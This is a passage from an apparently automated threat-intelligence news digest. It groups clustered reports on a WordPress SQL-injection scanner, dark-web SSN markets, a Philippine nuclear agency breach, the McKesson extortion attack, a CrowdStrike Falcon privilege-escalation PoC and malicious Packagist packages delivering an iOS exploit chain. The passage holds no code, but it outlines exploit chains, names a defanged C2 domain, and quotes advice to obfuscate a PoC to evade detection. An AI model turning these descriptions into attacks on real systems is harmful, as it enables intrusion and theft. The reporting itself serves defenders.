Searchlight Cyber and dividesbyzer0 Type: Auxiliary Pull request: #21694 contributed by zoomdbz Path: scanner/http/wordpress_wp2shell_sqli Description: Adds an auxiliary scanner module for the "wp2shell" WordPress core unauthenticated SQL injection: REST batch route confusion (CVE-2026-63030) chained with the WP_Query author__not_in string interpolation (CVE-2026-60137). Affects WordPress core 6.9.0-6.9.4 and 7.0.0-7.0.1 (fixed in 6.9.5 / 7.0.2, 2026-07-17). Inductive Automation Ignition Gateway Fingerprint Author: Ethan Thomason [email protected] Type: Auxiliary Pull request: #21603 contributed by ethan-thomason Path: scanner/scada/ignition_statusping Description: Adds an auxiliary scanner module that fingerprints Inductive Automation Ignition gateways across all major version families by probing unauthenticated info endpoints. OPC-UA Server Detection Author: Ethan Thomason [email protected] Type: Auxiliary Pull request: #21612 contributed by ethan-thomason Path: scanner/scada/opcua_enum Description: Adds auxiliary/scanner/scada/opcua_enum, a scanner module that detects OPC-UA servers speaking the OPC-UA TCP binary transport (opc.tcp://). Tenable Security Cent
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: Payloads and Exploits, and Scanners, Oh my!
  - Published: 2026-08-28T14:57:18+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-payloads-exploits-scanners

### Cluster 02c1e80dc5 — score 10

- Title: Identity-as-a-Service: Uncovering Dark Web Marketplaces Trading Executive SSNs
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-27T13:51:55+00:00
- Link: https://www.rapid7.com/blog/post/tr-identity-as-a-service-dark-web-marketplaces-executive-ssn
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
- affected_industries: financial_services, government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
- affected_industries: financial_services, government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Introduction Despite modern verification controls, identity theft remains one of the most pervasive threats to both individuals and enterprise organizations. U.S. Federal Trade Commission statistics show over 1 million identity theft reports annually, with related fraud and imposter scams accounting for billions in financial losses each year. While stolen credit cards enable rapid, short-term monetization, Social Security numbers (SSNs) represent a far more permanent and dangerous tier within the cybercrime ecosystem, because unlike payment cards, they cannot simply be deactivated. Once exposed, an SSN can support enabling unauthorized lines of credit, synthetic identity fraud, and sophisticated tax scams. When exposed identity data belongs to corporate executives, board members, and other high-profile employees, the risk can extend beyond the individual. Threat actors target these high-profile individuals not just for their premium credit profiles, but to leverage their compromised id
```

#### Full body

```
Back to Blog Threat Research Identity-as-a-Service: Uncovering Dark Web Marketplaces Trading Executive SSNs Alexandra Blia | Maor Weinberger Aug 27, 2026 | Last updated on Aug 27, 2026 | 15 min read DISCOVER RAPID7 MDR Introduction Despite modern verification controls, identity theft remains one of the most pervasive threats to both individuals and enterprise organizations. U.S. Federal Trade Commission statistics show over 1 million identity theft reports annually, with related fraud and imposter scams accounting for billions in financial losses each year. While stolen credit cards enable rapid, short-term monetization, Social Security numbers (SSNs) represent a far more permanent and dangerous tier within the cybercrime ecosystem, because unlike payment cards, they cannot simply be deactivated. Once exposed, an SSN can support enabling unauthorized lines of credit, synthetic identity fraud, and sophisticated tax scams. When exposed identity data belongs to corporate executives, board members, and other high-profile employees, the risk can extend beyond the individual. Threat actors target these high-profile individuals not just for their premium credit profiles, but to leverage their compromised identities for executive impersonation, corporate espionage, and downstream extortion. Rapid7’s recent alert telemetry underscores the severity of this targeted exposure: since early 2026 alone, we identified 476 instances of compromised SSN records across 395 unique corporate personnel. Over 73% of these exposures directly targeted top-level leadership, with C-suite executives comprising 44.6% of affected profiles and Presidents making up another 28.6%. Unsurprisingly, given the geographical nature of SSNs, 95.6% of these leaks stemmed from U.S.-headquartered organizations, concentrated heavily in high-value sectors like Financials (over 25%) and Industrials (17%). In this blog, we explore the operational mechanics of the underground identity economy, focusing on three dominant SSN marketplaces tracked by Rapid7: Xilo, Bankom, and PeopleFinder, which together account for 81.5% of all executive SSN leaks in our dataset (led by Xilo at 40.8%, Bankom at 21.8%, and PeopleFinder at 18.9%). Using Rapid7 alert telemetry from the past year, we look at the profiles of affected corporate executives, how these marketplaces operate, and highlight how proactive dark web monitoring can mitigate upstream identity exposure before it is weaponized. Why stolen SSNs retain their value Not all stolen data retains its value for the same length of time. Leaked credentials can be reset, payment cards can be cancelled, and session tokens eventually expire. While these data types remain highly sought after by cybercriminals, their usefulness often depends on acting quickly before the victim or service provider invalidates them. SSNs differ as they are effectively permanent, serving as a core identity attribute. Once exposed, they can remain valuable for years, enabling a wide range of fraud schemes long after the original breach. When combined with other personally identifiable information (PII), such as a victim's name, date of birth, address, phone number, and employment history, an SSN becomes the foundation of a comprehensive identity profile that can be bought, sold, and repeatedly abused across the criminal ecosystem. These identity profiles enable far more than traditional identity theft. Threat actors use them to open fraudulent financial accounts, create synthetic identities, bypass identity verification processes, file fraudulent tax or government benefit claims, and support highly targeted social engineering campaigns. Rather than serving a single purpose, a complete identity record becomes a reusable asset that can be monetized multiple times by different threat actors. For corporate executives and other high-profile employees, exposed identity data can also create risk for the organization they represent. Publicly available information, from re
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Identity-as-a-Service: Uncovering Dark Web Marketplaces Trading Executive SSNs
  - Published: 2026-08-27T13:51:55+00:00
  - Link: https://www.rapid7.com/blog/post/tr-identity-as-a-service-dark-web-marketplaces-executive-ssn
  - Summary: Introduction Despite modern verification controls, identity theft remains one of the most pervasive threats to both individuals and enterprise organizations. U.S. Federal Trade Commission statistics show over 1 million identity theft reports annually, with related fraud and imposter scams accounting for billions in financial losses each year. While stolen credit cards enable rapid, short-term monetization, Social Security numbers (SSNs) represent a far more permanent and dangerous tier within the cybercrime ecosystem, because unlike payment cards, they cannot simply be deactivated. Once exposed, an SSN can support enabling unauthorized lines of credit, synthetic identity fraud, and sophisticated tax scams. When exposed identity data belongs to corporate executives, board members, and other high-profile employees, the risk can extend beyond the individual. Threat actors target these high-profile individuals not just for their premium credit profiles, but to leverage their compromised id

### Cluster d19603372e — score 10

- Title: Old, Unpatched Flaws Give Attackers Access to Philippines Nuclear Agency
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-02T01:00:00+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: financial_services, government
- affected_products: LiteSpeed, WordPress
- cve_ids: CVE-2023-49105, CVE-2024-2800
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: financial_services, government
- affected_products: WordPress, LiteSpeed
- cve_ids: CVE-2023-49105, CVE-2024-2800
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors exploited commodity vulnerabilities in ownCloud to gain initial access, resulting in stolen reactor databases, personnel records, and credential stores.
```

#### Full body

```
Cyberattacks & Data Breaches Cyber Risk Threat Intelligence Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Old, Unpatched Flaws Give Attackers Access to Philippines Nuclear Agency Threat actors exploited commodity vulnerabilities in ownCloud to gain initial access, resulting in stolen reactor databases, personnel records, and credential stores. Robert Lemos , Contributing Writer September 2, 2026 4 Min Read Source: AustralianCamera via Shutterstock Unpatched servers at a Philippine nuclear agency, a naval contractor, and other organizations allowed a cyberthreat group to breach networks and steal information on nuclear-material processes, IT planning, personnel, and other sensitive data. Researchers from threat hunting platform Hunt.io discovered the files on an ownCloud server hosted in Amsterdam that appeared to be a hub for the attackers, hosting offensive tools and stolen data, including 1,310 files totaling nearly 1.2GB. The files identified at least two of the victims: a nuclear agency in the Philippines and a marine engineering and shipbuilding company serving the Philippine Navy, Hunt.io stated in a blog post published on Aug. 26. A third database appears to be a list of potential targeted personnel at research and science facilities in the country as well. While Hunt.io did not attribute the attacks, the coding comments and folder names were written in Chinese, suggesting a Chinese-speaking threat actor. In addition, three popular open source offensive frameworks were also present on the server, but the vendor did not find any indications that they were used to attack the targeted organizations, says Esteban Borges, head of research for Hunt.io. Related: Dark Caracal Adds New Malware to Cyber Espionage Arsenal "Everything we saw is collection and exfiltration, no disruption tooling," he says. "The naval shipbuilder works with the Navy, which fits in with the South China Sea interests ... [but] nothing we recovered points to staging for a destructive effect." The incident highlights the growing threat landscape in the Philippines , with breach incidents nearly tripling in the first half of 2026, compared to the same period in 2025, according to a report from Vietnam-based cybersecurity services firm Viettel Security. While most attacks (51%) have targeted the banking, financial services, and insurance (BFSI) sector, government agencies are targeted in 18% of incidents, the report found. A significant factor in the burgeoning cyber-risk in the region is political tension between China and the countries claiming territory in the South China Sea. China has often used cyber operations against its rivals in the region , from Taiwan to Vietnam and from South Korea to the Philippines. Old Flaws, New Breaches Tellingly, the attacks on highly sensitive systems succeeded through exploiting vulnerabilities disclosed — and patched — more than two years ago. The nuclear agency uses ownCloud, a popular open source project allowing users and organizations to create their own cloud service. In November 2023, the project disclosed a vulnerability, tracked as CVE-2023-49105, that allows an attacker to bypass authentication in the software's pre-signed URL mechanism that enables the operator to access data on servers. The second security issue affected the LiteSpeed Cache WordPress plug-in (CVE-2024-2800) and was patched in August 2024. Related: Pakistan's Transparent Tribe Refreshes Toolset for Afghan Cyberattacks Yet, more than 24 months after their disclosures, the vulnerabilities remained exploitable on Internet-facing systems belonging to highly sensitive organizations. Borges says organizations need to harden their systems and do the basics: patch and inventory Internet-facing collaboration software, especially WordPress sites ; configure hardware with minim
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Old, Unpatched Flaws Give Attackers Access to Philippines Nuclear Agency
  - Published: 2026-09-02T01:00:00+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
  - Summary: Threat actors exploited commodity vulnerabilities in ownCloud to gain initial access, resulting in stolen reactor databases, personnel records, and credential stores.

### Cluster 0a3458104e — score 10

- Title: McKesson copes with fallout from data theft extortion attack
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-08-31T21:39:01+00:00
- Link: https://cyberscoop.com/mckesson-data-theft-extortion-attack-shinyhunters/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters
- affected_industries: education, healthcare
- affected_products: Salesforce, Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng
- actor_attribution: ShinyHunters
- affected_industries: healthcare, education
- affected_products: Salesforce, Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The major healthcare sector vendor did not identify the attackers, but ShinyHunters, a prolific group increasingly targeting the sector, claimed responsibility. The post McKesson copes with fallout from data theft extortion attack appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close McKesson said its business and distribution centers remain operational in the wake of a cyberattack it disclosed Friday that resulted in data theft and temporary service interruptions. Attackers gained access to some of the health care vendor’s third-party applications and stole data associated with a subset of customers in the company’s oncology, multispecialty and medical-surgical business units, Francisco Fraga, chief information and technology officer at McKesson, said in a statement Saturday. McKesson is a major player in the healthcare sector, claiming it distributes about one-third of all pharmaceuticals used throughout North America. It reported $403.4 billion in revenue for the one-year period ending in March. The company’s size and critical role it serves also makes it a high-profile target for cybercriminals. McKesson did not identify the group behind the attack, but ShinyHunters, a cybercrime group known for targeting large organizations with extortion demands after stealing massive amounts of sensitive data, claimed responsibility. Advertisement The company declined to answer questions about ShinyHunter’s claims. Yet, on Friday, McKesson disclosed the attack in a regulatory filing while ShinyHunters added the company to its data-leak site. McKesson said it discovered the attack Aug. 25. A period of widespread data theft was over by then, following a four-day intrusion beginning Aug. 21, according to researchers. “Upon discovery, we immediately activated our incident response protocols, launched an investigation, and engaged leading cybersecurity industry experts to support our response,” Fraga said in a statement. “We have reasonable assurance of no ongoing unauthorized activity in our systems. Customers can continue to connect to and use our systems and services as intended,” he added. While McKesson’s investigation continues, it faces a more urgent deadline of Sept. 1 from ShinyHunters, which is reportedly seeking a ransom demand in excess of $55 million. Advertisement The company did not answer questions about any ransom demand or whether it responded to the alleged attackers. The circumstances of the attack against McKesson are similar to other recent victims of ShinyHunters. The threat group typically uses social engineering or abuses weaknesses in identity to gain access to cloud-hosted environments containing troves of sensitive or proprietary data, which it threatens to leak if the victim doesn’t pay a ransom. “Opportunistic data extortionists have been able to identify weaknesses within identity and access management, making these campaigns both cheap and scalable,” said Ian Gray, vice president of cyber threat intelligence at Flashpoint. “These attacks are particularly difficult to detect early because they often occur entirely within vendor-hosted environments using valid, socially-engineered credentials,” he added. “Since this activity mimics normal support or data-warehouse tasks, it typically doesn’t trip traditional malware alerts or show anomalies, meaning organizations often remain unaware of the breach until the extortionists make contact.” Researchers have linked ShinyHunters to multiple attack sprees targeting major cloud platforms, including Oracle , Salesforce and Snowflake. The decentralized crew of cybercriminals was also linked to an expansive compromise last summer impacting hundreds of Salesloft Drift customers that put any platform integrated with the AI chat agent at risk as well. Advertisement In April, ShinyHunters broke into the systems of Canvas — a central hub for K-12 and university coursework, exams, grades and communication — causing widespread outages and data theft. When an early deadline passed without payment, ShinyHunters escalated its pressure on Instructure, the company behind Canvas, by defacing the platform’s login pages with an extortion message that was visible to hundreds of schools.
```

#### Corroborating sources (2)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: McKesson copes with fallout from data theft extortion attack
  - Published: 2026-08-31T21:39:01+00:00
  - Link: https://cyberscoop.com/mckesson-data-theft-extortion-attack-shinyhunters/
  - Summary: The major healthcare sector vendor did not identify the attackers, but ShinyHunters, a prolific group increasingly targeting the sector, claimed responsibility. The post McKesson copes with fallout from data theft extortion attack appeared first on CyberScoop .
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Healthcare Giant McKesson Investigates Data Breach Incident
  - Published: 2026-09-01T08:25:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
  - Summary: ShinyHunters claims to have stolen 284 million records from McKesson

### Cluster 78712c613a — score 10

- Title: Seemplicity Response Options accelerates vulnerability mitigation
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-09-03T07:17:45+00:00
- Link: https://www.helpnetsecurity.com/2026/09/03/seemplicity-response-options-vulnerability-management/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Seemplicity announced Response Options for vulnerability management and exposure management workflows. This new capability gives security teams multiple, actionable paths to closing a vulnerability finding based on context. The problem Response Options addresses is straightforward: the complete fix (a patch, an upgrade, a major configuration change) has been perceived as the safest long-term answer, but it’s also the slowest and most intrusive. It demands heavy testing, coordination, and sometimes a production reboot. Response Options gives … More → The post Seemplicity Response Options accelerates vulnerability mitigation appeared first on Help Net Security .
```

#### Full body

```
Industry News September 3, 2026 Share Seemplicity Response Options accelerates vulnerability mitigation Seemplicity announced Response Options for vulnerability management and exposure management workflows. This new capability gives security teams multiple, actionable paths to closing a vulnerability finding based on context. The problem Response Options addresses is straightforward: the complete fix (a patch, an upgrade, a major configuration change) has been perceived as the safest long-term answer, but it’s also the slowest and most intrusive. It demands heavy testing, coordination, and sometimes a production reboot. Response Options gives teams faster, lower-risk alternatives such as compensating controls, targeted configuration changes, and other steps that de-escalate exposure now, without waiting on the full remediation cycle. Each option carries a Readiness Indicator showing whether it can be deployed immediately or needs review first. Seemplicity’s autonomous AI Analysts pre-select the option they recommend, but every alternative stays visible, with the full reasoning behind it. “’Patch or nothing’ is what slows organizations down,” said Ravid Circus , CPO at Seemplicity. “Old prioritization signals like attack complexity and exploit availability are breaking down. Frontier AI makes complexity trivial and exploits abundant. Automated, preemptive response is now the necessary next step, not just a nice-to-have.” Security teams are working with less time than ever, as AI accelerates how quickly a disclosed vulnerability becomes a working exploit. Response Options is built for that reality with the fastest safe option should never be hidden behind the slowest comprehensive one. Response Options is available now to all Seemplicity customers. More about Seemplicity Share
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Seemplicity Response Options accelerates vulnerability mitigation
  - Published: 2026-09-03T07:17:45+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/03/seemplicity-response-options-vulnerability-management/
  - Summary: Seemplicity announced Response Options for vulnerability management and exposure management workflows. This new capability gives security teams multiple, actionable paths to closing a vulnerability finding based on context. The problem Response Options addresses is straightforward: the complete fix (a patch, an upgrade, a major configuration change) has been perceived as the safest long-term answer, but it’s also the slowest and most intrusive. It demands heavy testing, coordination, and sometimes a production reboot. Response Options gives … More → The post Seemplicity Response Options accelerates vulnerability mitigation appeared first on Help Net Security .

### Cluster 6719361d31 — score 10

- Title: Researcher Releases FalconFlank PoC Showing Privilege Escalation in CrowdStrike Falcon
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-03T06:26:59+00:00
- Link: https://thehackernews.com/2026/09/researcher-releases-falconflank-poc.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_products: GitHub, Microsoft Defender
- cve_ids: CVE-2026-50656, CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_products: Microsoft Defender, GitHub
- cve_ids: CVE-2026-69414, CVE-2026-50656
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The security researcher known as Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has dropped a new zero-day dubbed FalconFlank, a privilege escalation flaw impacting Crowdstrike Falcon. "FalconFlank is a 0day privilege escalation that abuses the office malicious macros remediation in CrowdStrike Falcon Sensor," the researcher said in a GitHub README file, adding
```

#### Full body

```
Researcher Releases FalconFlank PoC Showing Privilege Escalation in CrowdStrike Falcon  Ravie Lakshmanan  Sep 03, 2026 Vulnerability / Endpoint Security The security researcher known as Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has dropped a new zero-day dubbed FalconFlank , a privilege escalation flaw impacting Crowdstrike Falcon. "FalconFlank is a 0day privilege escalation that abuses the office malicious macros remediation in CrowdStrike Falcon Sensor," the researcher said in a GitHub README file, adding the cybersecurity company may already have detections for the flaw by now. "So if you want to test, you either have to add it to the exclusions or obfuscate the PoC and change the DLL load technique." The PoC, the researcher added, works in a fully updated Windows 11 25H2 machine or Windows Server 2025 with Crowdstrike Falcon. The Hacker News has contacted CrowdStrike for comment, and we will update the story if we hear back. The development comes days after Chaotic Eclipse released a PoC for another privilege escalation flaw impacting Kaspersky's endpoint security product for Windows (version 14.0.0.504). The exploit has been codenamed HardBreacher . "The PoC is not in the best shape at all, it is basically duct tapped, I just managed to make it work and that's all," the researcher said. "It will fail to run with error so you just have to keep rerunning it. If it succeeds, it will create a file in C:\Windows\System32\MY_SNAKE_IS_SOLID.dll with full permissions for the current user." "The interesting part about this is that Kaspersky completely loses it when you take control over the UI process, you can cause it to stop functioning, grant/block access to files it's not supposed to, if the PoC succeeds, the entire operating system becomes a hot mess." When reached for comment, Kaspersky told The Hacker News that it has resolved the HardBreacher issue. "The corresponding fix is delivered via an automatic update, or users can trigger database update manually," the company said. Last month, the researcher also published a PoC for a Microsoft Defender zero-day called ShieldBreak (aka CVE-2026-69414) that could grant an attacker the ability to run arbitrary code with NT AUTHORITY\SYSTEM privileges. It's assessed to be a patch bypass for CVE-2026-50656 (aka RoguePlanet). Microsoft has yet to release a fix. "Like its predecessors, ShieldBreak explores a different corner of the Windows operating system," LevelBlue said . "Where RedSun abused the Cloud Files API and TieringEngineService to redirect a Defender write into System32, and LegacyHive weaponized offline registry hive manipulation and the NT Object Manager namespace, ShieldBreak combines Cloud Files, Object Manager namespace manipulation, direct Windows Defender API invocation, and a timing race in the remediation path." "The result is a self-contained local privilege escalation chain in which Windows Defender's own clean engine is redirected to write an attacker-supplied DLL to C:\Windows\System32\phoneinfo.dll, followed by SYSTEM execution through the built-in Windows Error Reporting task." Shortly after, the researcher claimed that Microsoft continues to ghost them and refuses to engage in "any sort of communication," stating the company is "trying hard to paint me as some insane criminal." "I can't even report the bugs I find to their respective vendors because of the restrictions by Microsoft, all of this is of their own doing and you know, they don't even bother to check my case to figure out what's wrong," they said in a post dated August 14, 2026. "Think I will start publishing bugs for third-parties in that window where Patch Tuesday isn't released yet. I just want to live like a normal human being for once in my life, is that too much to ask for...?" Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  endpoin
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researcher Releases FalconFlank PoC Showing Privilege Escalation in CrowdStrike Falcon
  - Published: 2026-09-03T06:26:59+00:00
  - Link: https://thehackernews.com/2026/09/researcher-releases-falconflank-poc.html
  - Summary: The security researcher known as Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has dropped a new zero-day dubbed FalconFlank, a privilege escalation flaw impacting Crowdstrike Falcon. "FalconFlank is a 0day privilege escalation that abuses the office malicious macros remediation in CrowdStrike Falcon Sensor," the researcher said in a GitHub README file, adding

### Cluster c0456846cc — score 10

- Title: 13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-01T14:07:20+00:00
- Link: https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Packagist

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- affected_products: Apple iOS/macOS, Packagist
- cve_ids: CVE-2025-31277, CVE-2025-43398, CVE-2025-43510, CVE-2025-43520, CVE-2025-43529
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: financial_services
- affected_products: Packagist, Apple iOS/macOS
- cve_ids: CVE-2025-31277, CVE-2025-43529, CVE-2025-43398, CVE-2025-43510, CVE-2025-43520
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect
```

#### Full body

```
13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds  Ravie Lakshmanan  Sep 01, 2026 Malware / Web Security Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect chain, and, on iPhones, a WebKit-to-kernel exploit chain that installs spyware," Socket security researcher Kush Pandya said . The activity is assessed to be part of a campaign that was first documented by the application security company back in March 2026 that leveraged six malicious Packagist packages posing as OphimCMS themes to redirect visitors, exfiltrate URLs, inject ads, and serve from Funnull -hosted infrastructure a second-stage payload to lead victims to gambling and adult content sites. The complete set of packages, which span five vendor namespaces, is below - vsmov: theme-dy, theme-rrdyw, theme-motchill, theme-vsmov vsphim: theme-heovl, theme-thempho haiau009: kkphim-legend, kkphim-motchill chilltvcms: theme-legend ophimcms: theme-dy, theme-motchill, theme-pcc, theme-rrdyw At a high level, the trojanized Composer theme injects JavaScript that runs a mobile gambling and ad-fraud redirect and, on iPhones, a Funnull-hosted WebKit-to-kernel exploit chain ending in spyware and cryptocurrency-wallet theft. The iOS attack chain is designed to insert a hidden iframe element that determines the iOS version and loads an operating system-specific version of the exploit. Specifically, it weaponizes two WebKit vulnerabilities -- CVE-2025-31277 (Patched in version 18.6) and CVE-2025-43529 (Patched in versions 18.7.3 and 26.2) -- in a manner that's analogous to the DarkSword exploit kit. The payload then pivots out of the WebContent sandbox into the GPU process, followed by a second stage that reaches the kernel through the AppleM2ScalerCSCDriver IOKit user client and ultimately obtains read and write privileges. Apple is said to have addressed the kernel escape flaw in iOS and macOS 26.1 . Pandya told The Hacker News that Apple did not share a CVE identifier for the kernel escape vulnerability, but that the iPhone maker confirmed the issue had already been patched in iOS 26.1 and macOS 26.1 before receiving their report. It's suspected to be CVE-2025-43398 , CVE-2025-43510 , or CVE-2025-43520 , all of which were kernel-related bugs fixed late last year. "On success, the final payload uses the kernel read to collect keychain databases, Wi-Fi passwords, the SMS database, the address book, Photos, browser cookies, call history, location history, and account databases, encrypts them with AES, and uploads them over HTTPS POST /upload to a rotating pool of command and control domains," Pandya explained. "The worker beacons exploitation progress to cloudfareintcdn[.]com/wd-status.html." The threat actors behind the campaign have been found to redeploy the whole iOS chain around August 12, 2026, mainly targeting iOS devices running versions 18.4 through 18.6.x with a new payload that adds an iOS Keychain cryptocurrency wallet seed and mnemonic stealer. The malware queries the password store for wallet material from Bitget, BitKeep, Bitpie, Phantom, Tonkeeper, Trust Wallet, and OKX, extending beyond device data collection to direct financial theft. Socket said the same five vendor namespaces have published additional theme packages that carry no active payload at the time of analysis, although they have been configured such that the malicious code could be activated via "Custom JS" fields rendered into every page on the websites. It's not clear who is behind the campaign, although it's believed to be the work of a Vietnamese-operated group based on commit metadata timestamps. It's worth pointing out that the
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: 13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds
  - Published: 2026-09-01T14:07:20+00:00
  - Link: https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
  - Summary: Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect

### Cluster 8e0b5344fa — score 10

- Title: Rooted in Trust: Three privilege-escalation vulnerabilities in HP Easy Start for macOS (CVE-2026-12554, CVE-2026-12555, CVE-2026-12556)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-02T19:49:38+00:00
- Link: https://www.reddit.com/r/netsec/comments/1w5l1j8/rooted_in_trust_three_privilegeescalation/
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 2
- Strong signals: Apple iOS/macOS, CVE-2026-12554, CVE-2026-12555, CVE-2026-12556

#### Cluster taxonomy (union across members)
- actor_attribution: Nimbus Manticore
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-12554, CVE-2026-12555, CVE-2026-12556
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-12554, CVE-2026-12555, CVE-2026-12556
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
Three high-severity vulnerabilities in HP Easy Start for macOS, rated CVSS 8.5, 7.7 and 7.7. The research looks at the trust boundaries around privileged components and how they can break down in practice. HP has published an advisory and released an updated version. Disclosure: I’m the researcher who reported these vulnerabilities. submitted by /u/ciphersecuritylabs [link] [comments]
```

#### Corroborating sources (2)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Rooted in Trust: Three privilege-escalation vulnerabilities in HP Easy Start for macOS (CVE-2026-12554, CVE-2026-12555, CVE-2026-12556)
  - Published: 2026-09-02T19:49:38+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1w5l1j8/rooted_in_trust_three_privilegeescalation/
  - Summary: Three high-severity vulnerabilities in HP Easy Start for macOS, rated CVSS 8.5, 7.7 and 7.7. The research looks at the trust boundaries around privileged components and how they can break down in practice. HP has published an advisory and released an updated version. Disclosure: I’m the researcher who reported these vulnerabilities. submitted by /u/ciphersecuritylabs [link] [comments]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests
  - Published: 2026-09-01T13:08:58+00:00
  - Link: https://thehackernews.com/2026/09/iranian-hackers-pose-as-recruiters-to.html
  - Summary: The Iranian Nimbus Manticore hacking group has been attributed to two previously undocumented malware families that highlight the continued evolution of its toolset and likely expand its targeting footprint to infect Linux and Apple macOS systems using cross-platform remote access trojans (RATs) developed using Node.js and JavaScript. Russian cybersecurity company Kaspersky is tracking the

### Cluster a91efa5346 — score 9

- Title: Guildma (Astaroth) malware infection from Brazilian Portuguese email, (Tue, Sep 1st)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-01T21:30:18+00:00
- Link: https://isc.sans.edu/diary/rss/33300
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
